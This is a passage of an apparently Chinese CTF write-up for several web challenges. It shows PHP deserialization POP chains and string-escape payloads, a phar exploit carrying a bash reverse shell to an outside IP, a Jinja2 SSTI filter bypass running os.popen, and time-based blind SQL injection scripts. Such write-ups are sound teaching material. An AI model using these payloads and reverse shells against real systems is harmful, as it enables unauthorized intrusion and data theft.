class_">Start</span>&#123;</span><br><span class="line">    public $errMsg;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Pwn</span>&#123;</span><br><span class="line">    public $obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Reverse</span>&#123;</span><br><span class="line">    public $func;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Web</span>&#123;</span><br><span class="line">    public $func;</span><br><span class="line">    public $var;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Crypto</span>&#123;</span><br><span class="line">    public $obj;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Misc</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Start</span>();</span><br><span class="line">$a-&gt;errMsg = <span class="keyword">new</span> <span class="title class_">Crypto</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj = <span class="keyword">new</span> <span class="title class_">Reverse</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func = <span class="keyword">new</span> <span class="title class_">Pwn</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj = <span class="keyword">new</span> <span class="title class_">Web</span>();</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;<span class="keyword">var</span> = <span class="string">&quot;cat /f*&quot;</span>;</span><br><span class="line">$a-&gt;errMsg-&gt;obj-&gt;func-&gt;obj-&gt;func = <span class="string">&quot;system&quot;</span>;</span><br><span class="line">echo <span class="title function_">serialize</span>($a);</span><br><span class="line">#<span class="attr">O</span>:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">6</span>:<span class="string">&quot;errMsg&quot;</span>;<span class="attr">O</span>:<span class="number">6</span>:<span class="string">&quot;Crypto&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;<span class="attr">O</span>:<span class="number">7</span>:<span class="string">&quot;Reverse&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;<span class="attr">O</span>:<span class="number">3</span>:<span class="string">&quot;Pwn&quot;</span>:<span class="number">1</span>:&#123;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;<span class="attr">O</span>:<span class="number">3</span>:<span class="string">&quot;Web&quot;</span>:<span class="number">2</span>:&#123;<span class="attr">s</span>:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;<span class="attr">s</span>:<span class="number">6</span>:<span class="string">&quot;system&quot;</span>;<span class="attr">s</span>:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;<span class="attr">s</span>:<span class="number">7</span>:<span class="string">&quot;cat /f*&quot;</span>;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="逃"><a href="#逃" class="headerlink" title="逃"></a>逃</h2><p>一眼丁真 鉴定为反序列化字符串逃逸</p><p>考点：</p><ul><li>反序列化字符串逃逸</li></ul><p>从bad-&gt;good会多出一个字符 那么经过序列化-&gt;waf-&gt;反序列化就会有一个字符逃逸出来</p><p>举例执行whoami </p><p>将这一串塞入<code>&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code>那么就需要26个字符逃逸出来 那么就需要26个bad</p><p>paylaod：<code>badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:6:&quot;whoami&quot;;&#125;</code></p><p>其他命令根据字符个数改相应的bad个数调整即可</p><p>payload：<code>?key=badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad&quot;;s:3:&quot;cmd&quot;;s:9:&quot;cat /flag&quot;;&#125;</code></p><h2 id="flask-disk"><a href="#flask-disk" class="headerlink" title="flask disk"></a>flask disk</h2><p>这道题我应该是非预期了</p><p>我的做法是 直接上传app.py 内容直接是python命令执行反弹shell </p><p>这样会覆盖题目的app.py 直接拿下</p><p>知识点：<code>flask开启了debug模式下，app.py源文件被修改后会立刻加载。  </code></p><h2 id="PharOne"><a href="#PharOne" class="headerlink" title="PharOne"></a>PharOne</h2><p>这道题太可惜了</p><p>一眼丁真就是phar反序列化利用</p><p>当时由于自己开了vpn 导致反弹shell一直过不来  错失良机</p><p>考点：</p><ul><li>phar反序列化</li></ul><p>首先给了恶意类</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flag</span>&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        @<span class="title function_">exec</span>($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">@<span class="title function_">unlink</span>($_POST[<span class="string">&#x27;file&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>先生成一个phar文件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Flag</span>&#123;</span><br><span class="line">    public $cmd;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__destruct</span>(<span class="params"></span>)</span><br><span class="line">    &#123;</span><br><span class="line">        @<span class="title function_">exec</span>($this-&gt;cmd);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = <span class="keyword">new</span> <span class="title class_">Flag</span>();</span><br><span class="line">$a-&gt;cmd = <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/8.130.34.53/7777 0&gt;&amp;1&quot;&#x27;</span>;</span><br><span class="line">@<span class="title function_">unlink</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>);</span><br><span class="line">$phar = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;Z1d10t.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">$phar-&gt;<span class="title function_">startBuffering</span>();</span><br><span class="line">$phar-&gt;<span class="title function_">setStub</span>(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">$phar-&gt;<span class="title function_">setMetadata</span>($a); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">$phar-&gt;<span class="title function_">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="comment">//签名自动计算</span></span><br><span class="line">$phar-&gt;<span class="title function_">stopBuffering</span>(); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>上传上去之后显示过滤了__HALT_COMPILER</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642632042-0e857bfb-849f-4ca9-96eb-8ab35051a90b.png" alt="img"></p><p>可以通过gzip压缩绕过 来自：<a href="https://pankas.top/2022/08/04/php(phar)%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%84%E7%A7%8D%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/">php(phar)反序列化漏洞及各种绕过姿势</a><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642675212-31124284-5660-49f3-8ded-02d920345766.png" alt="img"></p><p>然后还会检测上传文件后缀名以及mine </p><p>当然phar文件后缀名是无关紧要的 不是<code>.phar</code>照样能解析</p><p>所以将打包的压缩包改为任意后缀名都行</p><p>然后注意这里<code>phar://</code>协议要到<code>Z1d10t.phar</code></p><p>上传上去之后<code>file=phar://upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg/Z1d10t.phar</code></p><p>记得关vpn 哭死</p><p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1697642947630-648bd479-d31a-42a1-a3db-e854baf8d485.png" alt="img"></p><h2 id="InjectMe"><a href="#InjectMe" class="headerlink" title="InjectMe"></a>InjectMe</h2><p>考点:</p><ul><li>jinja2 ssti</li></ul><p>首先是任意文件读取</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/download?file=/app/app.py</span><br></pre></td></tr></table></figure><p>获得源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> <span class="title class_">Flask</span>, render_template, request, abort, send_file, session, render_template_string</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> secret_key</span><br><span class="line"></span><br><span class="line">app = <span class="title class_">Flask</span>(__name__)</span><br><span class="line">app.<span class="property">secret_key</span> = secret_key</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">@app.<span class="title function_">route</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">def <span class="title function_">hello_world</span>():  # put application<span class="string">&#x27;s code here</span></span><br><span class="line"><span class="string">    return render_template(&#x27;</span>index.<span class="property">html</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&quot;/cancanneed&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def cancanneed():</span></span><br><span class="line"><span class="string">    all_filename = os.listdir(&#x27;</span>./<span class="keyword">static</span>/img/<span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    filename = request.args.get(&#x27;</span>file<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    if filename:</span></span><br><span class="line"><span class="string">        return render_template(&#x27;</span>img.<span class="property">html</span><span class="string">&#x27;, filename=filename, all_filename=all_filename)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        return f&quot;&#123;str(os.listdir(&#x27;</span>./<span class="keyword">static</span>/img/<span class="string">&#x27;))&#125; &lt;br&gt; &lt;a href=\&quot;/cancanneed?file=1.jpg\&quot;&gt;/cancanneed?file=1.jpg&lt;/a&gt;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&quot;/download&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def download():</span></span><br><span class="line"><span class="string">    filename = request.args.get(&#x27;</span>file<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    if filename:</span></span><br><span class="line"><span class="string">        filename = filename.replace(&#x27;</span>../<span class="string">&#x27;, &#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">        filename = os.path.join(&#x27;</span><span class="keyword">static</span>/img/<span class="string">&#x27;, filename)</span></span><br><span class="line"><span class="string">        print(filename)</span></span><br><span class="line"><span class="string">        if (os.path.exists(filename)) and (&quot;start&quot; not in filename):</span></span><br><span class="line"><span class="string">            return send_file(filename)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            abort(500)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        abort(404)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.route(&#x27;</span>/backdoor<span class="string">&#x27;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="string">def backdoor():</span></span><br><span class="line"><span class="string">    try:</span></span><br><span class="line"><span class="string">        print(session.get(&quot;user&quot;))</span></span><br><span class="line"><span class="string">        if session.get(&quot;user&quot;) is None:</span></span><br><span class="line"><span class="string">            session[&#x27;</span>user<span class="string">&#x27;] = &quot;guest&quot;</span></span><br><span class="line"><span class="string">        name = session.get(&quot;user&quot;)</span></span><br><span class="line"><span class="string">        if re.findall(</span></span><br><span class="line"><span class="string">                r&#x27;</span>__|&#123;&#123;|<span class="keyword">class</span>|base|init|mro|subclasses|builtins|globals|flag|os|system|popen|<span class="built_in">eval</span>|:|\+|request|cat|tac|base64|nl|hex|\\u|\\x|\.<span class="string">&#x27;,</span></span><br><span class="line"><span class="string">                name):</span></span><br><span class="line"><span class="string">            abort(500)</span></span><br><span class="line"><span class="string">        else:</span></span><br><span class="line"><span class="string">            return render_template_string(</span></span><br><span class="line"><span class="string">                &#x27;</span>竟然给&lt;h1&gt;%s&lt;/h1&gt;你找到了我的后门，你一定是网络安全大赛冠军吧！😝 &lt;br&gt; 那么 现在轮到你了!&lt;br&gt; 最后祝您玩得愉快!😁<span class="string">&#x27; % name)</span></span><br><span class="line"><span class="string">    except Exception:</span></span><br><span class="line"><span class="string">        abort(500)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.errorhandler(404)</span></span><br><span class="line"><span class="string">def page_not_find(e):</span></span><br><span class="line"><span class="string">    return render_template(&#x27;</span><span class="number">404.</span>html<span class="string">&#x27;), 404</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">@app.errorhandler(500)</span></span><br><span class="line"><span class="string">def internal_server_error(e):</span></span><br><span class="line"><span class="string">    return render_template(&#x27;</span><span class="number">500.</span>html<span class="string">&#x27;), 500</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == &#x27;</span>__main__<span class="string">&#x27;:</span></span><br><span class="line"><span class="string">    app.run(&#x27;</span><span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span><span class="string">&#x27;, port=8080)</span></span><br></pre></td></tr></table></figure><p>发现<code>/backdoor</code> 可以进行ssti 但是先获取key</p><p>查看源码 可以发现secret是由config引进来的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from config import secret_key</span><br></pre></td></tr></table></figure><p>读取key<code>/download?file=/app/config.py</code>获得<code>secret_key = &quot;y0u_n3ver_k0nw_s3cret_key_1s_newst4r&quot;</code></p><p>最难绷的就是这个session里面进行ssti payload一多就会爆500错真的让人难绷</p><p>能不能对session的获取加个base64编解码。。。 真的会方便很多 </p><p>还有session伪造的时候转义。。。。编个码吧</p><p>payload：<code>&#123;% print(config['_''_cl''ass_''_']['_''_in''it_''_']['_''_glo''bals_''_']['o''s']['pop''en']('head /y0*')['read']()) %&#125;&quot;&#125;&#39;</code></p><h2 id="midsql"><a href="#midsql" class="headerlink" title="midsql"></a>midsql</h2><p>考点:</p><ul><li>sql时间盲注</li></ul><p>这个题目找到自己缺漏的地方了 没咋好好做过时间盲注</p><p>导致自己写的脚本注起来太慢了</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://fef1d48c-1c22-46b2-aba3-0d22fafc8c10.node4.buuoj.cn:81&#x27;</span></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    low=<span class="number">31</span></span><br><span class="line">    high=<span class="number">127</span></span><br><span class="line">    mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    <span class="keyword">while</span> low&lt;=<span class="attr">high</span>:</span><br><span class="line">        paylaod = <span class="string">&quot;1/**/And/**/if(ascii(substr((select/**/group_Concat(name)/**/from/**/ctf.items),&#123;&#125;,1))/**/&gt;/**/&#123;&#125;,sleep(5),0)%23&quot;</span>.<span class="title function_">format</span>(i,mid)</span><br><span class="line">        #爆库：<span class="number">1</span><span class="comment">/**/</span><span class="title class_">And</span><span class="comment">/**/</span><span class="keyword">if</span>(<span class="title function_">ascii</span>(<span class="title function_">substr</span>(<span class="title function_">database</span>(),&#123;&#125;,<span class="number">1</span>))<span class="comment">/**/</span>&gt;<span class="comment">/**/</span>&#123;&#125;,<span class="title function_">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)%<span class="number">23</span></span><br><span class="line">        #报表：<span class="number">1</span><span class="comment">/**/</span><span class="title class_">And</span><span class="comment">/**/</span><span class="keyword">if</span>(<span class="title function_">ascii</span>(<span class="title function_">substr</span>((select<span class="comment">/**/</span><span class="title function_">group_concat</span>(table_name)<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>information_schema.<span class="property">tables</span><span class="comment">/**/</span>where<span class="comment">/**/</span>table_schema<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="string">&#x27;ctf&#x27;</span>),&#123;&#125;,<span class="number">1</span>))<span class="comment">/**/</span>&gt;<span class="comment">/**/</span>&#123;&#125;,<span class="title function_">sleep</span>(<span class="number">5</span>),<span class="number">0</span>)%<span class="number">23</span></span><br><span class="line">        #爆列：<span class="number">1</span><span class="comment">/**/</span><span class="title class_">And</span><span class="comment">/**/</span><span class="keyword">if</span>(<span class="title function_">ascii</span>(<span class="title class_">Substr</span>((<span class="title class_">Select</span>(<span class="title function_">group_Concat</span>(column_name))<span class="title function_">from</span>(<span class="title class_">Information</span>_schema.<span class="property">columns</span>)<span class="title class_">Where</span>(table_name<span class="comment">/**/</span>like<span class="comment">/**/</span><span class="string">&#x27;items&#x27;</span>)),&#123;&#125;,<span class="number">1</span>))<span class="comment">/**/</span>&gt;<span class="comment">/**/</span>&#123;&#125;,<span class="title function_">sleep</span>(<span class="number">4</span>),<span class="number">0</span>)%<span class="number">23</span></span><br><span class="line">        #爆数据：</span><br><span class="line">        timestart = time.<span class="title function_">time</span>()</span><br><span class="line">        r = requests.<span class="title function_">get</span>(url+<span class="string">&quot;?id=&quot;</span>+paylaod)</span><br><span class="line">        timeend = time.<span class="title function_">time</span>()</span><br><span class="line">        <span class="keyword">if</span> (timeend - timestart &gt;= <span class="number">3</span>):</span><br><span class="line">            low = mid+<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">        <span class="attr">else</span>:</span><br><span class="line">            high = mid-<span class="number">1</span></span><br><span class="line">            mid = (low+high)<span class="comment">//2</span></span><br><span class="line">    result+=<span class="title function_">chr</span>(high+<span class="number">1</span>)</span><br><span class="line">    <span class="title function_">print</span>(result)</span><br></pre></td></tr></table></figure><p>通过时间差值来判断有时候会不准 </p><p>最好通过捕获异常的方式进行判断会更准</p><p>更好的方式:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">last = <span class="string">&#x27; &#x27;</span></span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&#x27;Host&#x27;</span>: <span class="string">&#x27;32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Cache-Control&#x27;</span>: <span class="string">&#x27;max-age=0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Upgrade-Insecure-Requests&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept&#x27;</span>: <span class="string">&#x27;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Referer&#x27;</span>: <span class="string">&#x27;http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Encoding&#x27;</span>: <span class="string">&#x27;gzip, deflate&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Accept-Language&#x27;</span>: <span class="string">&#x27;zh-CN,zh;q=0.9&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="title function_">trange</span>(<span class="number">1</span>, <span class="number">1000</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="title function_">range</span>(<span class="number">127</span>, <span class="number">31</span>, -<span class="number">1</span>):</span><br><span class="line">        url = r<span class="string">&#x27;http://32b8f193-b922-4f0d-a4e7-2228ad9174e3.node4.buuoj.cn:81/?id=&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(schema_name)/**/from/**/information_schema.schemata),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span> # information_schema,mysql,performance_schema,sys,test,ctf</span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/database()),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema/**/like/**/&quot;ctf&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name/**/like/**/&quot;items&quot;),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span> # id,name,price</span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        # payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(id,0x3a,name,0x3a,price)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        payload = rf<span class="string">&#x27;1/**/and/**/if((ascii(substr((select/**/group_concat(name)/**/from/**/ctf.items),&#123;i&#125;,1))&gt;&#123;j&#125;),sleep(3),0)&#x27;</span></span><br><span class="line">        url = url + payload</span><br><span class="line">        # <span class="title function_">print</span>(url)</span><br><span class="line">        <span class="attr">try</span>:</span><br><span class="line">            response = requests.<span class="title function_">get</span>(url=url, timeout=<span class="number">3</span>)</span><br><span class="line">        except <span class="title class_">Exception</span> <span class="keyword">as</span> <span class="attr">e</span>:</span><br><span class="line">            last = res</span><br><span class="line">            # <span class="title function_">print</span>(<span class="title function_">chr</span>(j+<span class="number">1</span>))</span><br><span class="line">            res += <span class="title function_">chr</span>(j+<span class="number">1</span>)</span><br><span class="line">            # <span class="title function_">print</span>(res)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="title function_">print</span>(<span class="string">&#x27;[*] &#x27;</span> + res)</span><br></pre></td></tr></table></figure><h2 id="OtenkiBoy（未解出）"><a href="#OtenkiBoy（未解出）" class="headerlink" title="OtenkiBoy（未解出）"></a>OtenkiBoy（未解出）</h2><p>不太会 不想代码审计了qwq</p><h1 id="WEEK5"><a href="#WEEK5" class="headerlink" title="WEEK5"></a>WEEK5</h1><h2 id="Unserialize-Again"><a href="#Unserialize-Again" class="headerlink" title="Unserialize Again"></a>Unserialize Again</h2><p>考点：</p><ul><li>phar反序列化</li><li>phar重签名</li></ul><p>源码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="title function_">highlight_file</span>(__FILE__);</span><br><span class="line"><span class="title function_">error_reporting</span>(<span class="number">0</span>);  </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">story</span>&#123;</span><br><span class="line">    private $user=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    public $pass;</span><br><span class="line">    public $eating;</span><br><span class="line">    public $God=<span class="string">&#x27;false&#x27;</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="title function_">__wakeup</span>(<span class="params"></span>)&#123;</span><br><span class="line">        $this-&gt;user=<span class="string">&#x27;human&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span 